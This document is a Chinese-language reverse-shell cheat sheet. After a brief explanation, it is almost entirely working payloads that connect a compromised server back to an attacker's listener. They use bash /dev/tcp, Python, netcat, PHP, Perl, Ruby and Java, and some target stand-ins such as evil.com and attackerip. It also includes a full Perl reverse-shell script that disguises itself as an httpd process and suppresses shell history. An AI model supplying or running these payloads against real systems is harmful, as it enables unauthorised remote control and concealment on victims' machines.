# 反弹shell备忘录

简单理解，通常是我们主动发起请求，去访问服务器（某个IP的某个端口），比如我们常访问的web服务器：`http(https)://ip:80`，这是因为在服务器上面开启了80端口的监听，我们去访问它的时候，就会给我们建立连接。而现在所谓的`反弹shell`指的是反过来在我们自己的公网vps建立监听，然后让服务器反弹一个shell来连接我们自己的主机，然后我们就能通过反弹的shell去远程控制服务器了。

接受端运行

```
nc -lvp port
```

bash

```ruby
bash -i >& /dev/tcp/ip/port 0>&1
```

![1573140057801.png](https://i.loli.net/2019/11/07/zjqSWmE9yiQLsFr.png)

python

```swift
python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
```

```
python -c "import pty;pty.spawn('/bin/bash')" python反弹标准shell
```

```
python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('127.0.0.1',9000))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"
```
![image-20191108131526470.png](https://i.loli.net/2019/11/08/YXCVu9v8dDf1kGJ.png)

nc

```csharp
nc -e /bin/bash 192.168.1.146 7777 #不是所有版本都支持 -e参数
```
不支持-e参数的时候

```
mknod backpipe p && nc attackerip 8080 0<backpipe | /bin/bash 1>backpipe
/bin/sh | nc attackerip 4444
rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/
```

php

```csharp
php -r 'exec("/bin/bash -i >& /dev/tcp/192.168.1.146/7777");'
```

```dart
php -r '$sock=fsockopen("ip",port);exec("/bin/bash -i <&3 >&3 2>&3");'
```

exec

```
exec 5<>/dev/tcp/evil.com/8080
```

prel

```
#!/usr/bin/perl -w
# perl-reverse-shell - A Reverse Shell implementation in PERL
use strict;
use Socket;
use FileHandle;
use POSIX;
my $VERSION = "1.0";

# Where to send the reverse shell.  Change these.
my $ip = '127.0.0.1';
my $port = 1234;

# Options
my $daemon = 1;
my $auth   = 0; # 0 means authentication is disabled and any 
        # source IP can access the reverse shell
my $authorised_client_pattern = qr(^127\.0\.0\.1$);

# Declarations
my $global_page = "";
my $fake_process_name = "/usr/sbin/apache";

# Change the process name to be less conspicious
$0 = "[httpd]";

# Authenticate based on source IP address if required
if (defined($ENV{'REMOTE_ADDR'})) {
    cgiprint("Browser IP address appears to be: $ENV{'REMOTE_ADDR'}");

    if ($auth) {
        unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {
            cgiprint("ERROR: Your client isn't authorised to view this page");
            cgiexit();
        }
    }
} elsif ($auth) {
    cgiprint("ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access");
    cgiexit(0);
}

# Background and dissociate from parent process if required
if ($daemon) {
    my $pid = fork();
    if ($pid) {
        cgiexit(0); # parent exits
    }

    setsid();
    chdir('/');
    umask(0);
}

# Make TCP connection for reverse shell
socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {
    cgiprint("Sent reverse shell to $ip:$port");
    cgiprintpage();
} else {
    cgiprint("Couldn't open reverse shell to $ip:$port: $!");
    cgiexit();    
}

# Redirect STDIN, STDOUT and STDERR to the TCP connection
open(STDIN, ">&SOCK");
open(STDOUT,">&SOCK");
open(STDERR,">&SOCK");
$ENV{'HISTFILE'} = '/dev/null';
system("w;uname -a;id;pwd");
exec({"/bin/sh"} ($fake_process_name, "-i"));

# Wrapper around print
sub cgiprint {
    my $line = shift;
    $line .= "<p>\n";
    $global_page .= $line;
}

# Wrapper around exit
sub cgiexit {
    cgiprintpage();
    exit 0; # 0 to ensure we don't give a 500 response.
}

# Form HTTP response using all the messages gathered by cgiprint so far
sub cgiprintpage {
    print "Content-Length: " . length($global_page) . "\r
Connection: close\r
Content-Type: text\/html\r\n\r\n" . $global_page;
}
```

```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
ruby

```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
不依赖/bin/bash

```
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

```

Windows

```
ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

JAVA

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
